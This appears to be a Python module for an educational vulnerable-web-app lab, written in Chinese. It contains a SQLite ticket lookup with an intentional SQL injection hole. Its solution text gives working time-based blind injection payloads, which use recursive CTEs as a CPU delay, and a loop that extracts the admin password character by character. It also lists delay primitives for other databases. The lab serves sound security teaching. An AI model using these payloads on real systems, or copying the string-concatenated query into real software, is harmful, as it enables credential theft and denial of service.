"""工单查询处的盲注 —— SQLite 没有 SLEEP() 的时候怎么办。

这一题跟 `sqli/time_blind` 是一对，区别只有一个，但很关键：

  · `time_blind` 那道题**注册了一个 `sleep()` 函数**。有了它，
    payload 跟 MySQL 上写的完全一样。
  · 这一题**没有**。SQLite 本身就没有 `SLEEP()`，
    而真实环境里你也常常遇到「数据库不支持 sleep」或者「sleep 被禁了」。

  那延迟从哪来？

  答案：**算点重的东西。** 延迟不一定要来自"睡"，也可以来自"算"。
  这一题就是让你自己造一个 CPU 燃烧器。

  用递归 CTE 是最好的选择 —— 实测数据（同一台机器）：

     递归 CTE 600 万次     0.70 秒    峰值内存 12.6 MB（几乎不涨）
     randomblob(200MB)     0.92 秒    峰值内存 394 MB（涨了 380MB）

  两者耗时差不多，但一个吃 CPU、一个吃内存。**要当信道用，选吃 CPU 的** ——
  内存型原语跑几次就能把进程打死，而且内存分配的时间不稳定。
"""

import sqlite3
import time

from vuln4all import Vuln, render_template, request

DB_NAME = "tickets.db"

#: 目标密码。6 位，小写字母加数字。
SECRET = "q7m4xd"
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"

#: 超过这么久就认为"有人往查询里塞了重计算"。
DELAY_THRESHOLD = 2.0

#: 靶场自己的安全上限：单条语句最多跑这么久。
#:
#: 这一条**不是修复**，是靶场为了方便使用加的保护 —— 递归 CTE 的迭代次数
#: 由做题的人定，不封顶的话一个请求就能把 worker 占住几分钟。
#: 20 秒足够让"造延迟"这个技巧舒服地演示（拿 2~3 秒就够），
#: 又不会让靶场卡死。真实目标没有这个保护。
MAX_STATEMENT_SECONDS = 20.0

GOAL_ORACLE = "让页面产生可测量的延迟（自己造出来的延迟信道）"
GOAL_EXTRACTED = "把 admin 的密码完整猜出来并提交"


class SleeplessTimeBlind(Vuln):
    info = {
        "name": "工单查询处的盲注（数据库没有 SLEEP）",
        "author": ["guaidao2"],
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "页面不管输入什么、查到没查到、语句对不对，回的都是同一句话 ——"
            "只剩时间这一个信号。\n"
            "而这一次数据库**没有 SLEEP() 可用**：你得自己造一个能让它慢下来的表达式。"
        ),
        "hint": (
            "先随便输点什么，确认页面真的什么都不告诉你。\n"
            "然后回忆一下 `sqli/time_blind` 那道题：它是怎么造延迟的？\n"
            "—— 靠服务端**额外注册**了一个 `sleep()` 函数。\n"
            "这一题没注册。所以问题变成：\n"
            "  **不靠「睡」，能不能让一条 SQL 慢下来？**\n"
            "想想「慢」还能从哪来：\n"
            "  · 算很多次（循环）\n"
            "  · 分配很大一块内存\n"
            "  · 做很多次 IO\n"
            "SQLite 里分别对应什么写法？先在页面下面的输入框里试着让它慢下来。\n"
            "（页面上会显示这次查询花了多久 —— 方便你校准。）"
        ),
        "solution": (
            "一、先确认页面永远说同一句话：查一个存在的工单号和不存在的一个，\n"
            "   返回的 HTML 一模一样。所以只剩时间。\n\n"
            "二、造一个延迟。SQLite 没有 `SLEEP()`，但有**递归 CTE** ——\n"
            "   它就是一个可以控制的循环：\n\n"
            "     ' OR (SELECT count(*) FROM (\n"
            "              WITH RECURSIVE c(x) AS (\n"
            "                  SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 4000000\n"
            "              ) SELECT x FROM c)) -- \n\n"
            "   400 万次大约 0.5 秒，600 万次大约 0.7 秒。\n"
            "   想要几秒就把那个数字往上调。\n\n"
            "三、把它变成条件式的 —— 跟 `time_blind` 那道题同一个形状：\n\n"
            "     ' OR CASE WHEN (\n"
            "              (SELECT substr(password,1,1) FROM users WHERE username='admin')='q'\n"
            "          ) THEN (\n"
            "              SELECT count(*) FROM (\n"
            "                  WITH RECURSIVE c(x) AS (\n"
            "                      SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 6000000\n"
            "                  ) SELECT x FROM c)\n"
            "          ) ELSE 0 END -- \n\n"
            "   慢 → 猜对了；快 → 猜错了。\n\n"
            "四、写脚本，把 `substr` 的第二个参数从 1 数到 6：\n\n"
            "     for pos in 1..6:\n"
            "         for ch in 'abcdefghijklmnopqrstuvwxyz0123456789':\n"
            "             payload = 上面那个（换 %d 和 %s）\n"
            "             发请求，量耗时\n"
            "             if 耗时 > 1 秒: 记下 ch; break\n\n"
            "五、把密码提交到页面下面的框里。\n\n"
            "为什么「自己造延迟」这件事值得单独学：\n\n"
            "  真实的数据库千奇百怪，`sleep` 这条路经常断：\n"
            "    · **SQLite** —— 压根没有这个函数\n"
            "    · **SQL Server** —— 是 `WAITFOR DELAY '0:0:5'`，不是函数\n"
            "    · **Oracle** —— 靠 `DBMS_PIPE.RECEIVE_MESSAGE('a', 5)`，一个包收 5 秒\n"
            "    · 有些托管数据库**主动禁掉**了 sleep 类函数\n"
            "    · 有些平台对单条语句有超时，sleep 长一点就被掐\n\n"
            "  所以「怎么让这条语句慢下来」是一个**通用问题**，答案随环境变：\n\n"
            "    | 原语 | 吃的是 | 适不适合当信道 |\n"
            "    |---|---|---|\n"
            "    | 递归 CTE（循环） | CPU | **适合** —— 时间稳定，内存不涨 |\n"
            "    | `randomblob(N)` 大内存分配 | 内存 | 不适合 —— 30 倍内存换同样的时间 |\n"
            "    | 笛卡尔积自连接 | CPU | 可以，但行数不好精确控制 |\n"
            "    | 正则/`LIKE` 回溯 | CPU | 在 SQLite 上很弱（实测几乎不耗时） |\n"
            "    | 大表的 `COUNT(*)` | IO+CPU | 可以，但依赖表里有多少行 |\n\n"
            "  选原语的标准：**耗时可控、内存/IO 稳定、重复调用不会把服务打坏。**\n"
            "  递归 CTE 三条都满足，所以它是首选。\n\n"
            "（这一题在页面下方给了一个 20 秒的语句上限 —— 那不是修复，\n"
            " 是为了让靶场不被一个请求卡死。真实目标没有这个保护，\n"
            " 所以现实里要小心：一条构造不当的 payload 可能直接把库拖垮。）"
        ),
        "refs": [
            "https://portswigger.net/web-security/sql-injection/blind",
            "https://www.sqlite.org/lang_with.html",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / DB_NAME))
        con.executescript(
            """
            CREATE TABLE tickets (
                ticket_no TEXT PRIMARY KEY,
                subject   TEXT NOT NULL
            );
            INSERT INTO tickets (ticket_no, subject) VALUES
                ('T-1001', '登录页样式异常'),
                ('T-1002', '导出功能报错'),
                ('T-1003', '权限申请');
            CREATE TABLE users (
                username TEXT PRIMARY KEY,
                password TEXT NOT NULL
            );
            """
        )
        con.execute(
            "INSERT INTO users (username, password) VALUES (?,?)", ("admin", SECRET)
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / DB_NAME)

        def run_guarded(sql):
            """跑一条语句，带一个**故意的**宽松上限。

            注意这不是修复 —— 见模块开头的说明。递归 CTE 的迭代次数由
            请求里来的 payload 决定，不加限制的话一个请求能占住 worker 很久。
            """
            deadline = time.monotonic() + MAX_STATEMENT_SECONDS
            con = sqlite3.connect(db_path)

            def abort_if_too_long():
                return 1 if time.monotonic() > deadline else 0

            con.set_progress_handler(abort_if_too_long, 20000)
            try:
                con.execute(sql).fetchone()
            finally:
                con.close()

        @app.route("/", methods=["GET", "POST"])
        def index():
            ticket_no = ""
            elapsed = None
            feedback = None
            timed_out = False

            if request.method == "POST" and "ticket_no" in request.form:
                ticket_no = request.form.get("ticket_no", "")

                # ↓↓↓ 洞就在这里：工单号直接拼进 SQL ↓↓↓
                sql = "SELECT subject FROM tickets WHERE ticket_no = '%s'" % ticket_no
                # ↑↑↑ 正确做法：con.execute("... WHERE ticket_no = ?", (ticket_no,)) ↑↑↑

                started = time.monotonic()
                try:
                    run_guarded(sql)
                except sqlite3.Error as exc:
                    # 报错也不说 —— 这一题唯一的信号是时间
                    timed_out = "interrupted" in str(exc)
                elapsed = time.monotonic() - started

                if elapsed > DELAY_THRESHOLD:
                    ctx.progress.mark(GOAL_ORACLE)

            elif request.method == "POST":
                guess = request.form.get("guess", "").strip()
                if guess:
                    if guess == SECRET:
                        ctx.progress.mark(GOAL_EXTRACTED)
                        feedback = ("ok", "密码对了。")
                    else:
                        feedback = ("bad", "不对。")

            return render_template(
                "index.html",
                ticket_no=ticket_no,
                elapsed=elapsed,
                feedback=feedback,
                timed_out=timed_out,
                max_seconds=int(MAX_STATEMENT_SECONDS),
                length=len(SECRET),
                alphabet_size=len(ALPHABET),
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {
            GOAL_ORACLE: ctx.progress.achieved(GOAL_ORACLE),
            GOAL_EXTRACTED: ctx.progress.achieved(GOAL_EXTRACTED),
        }
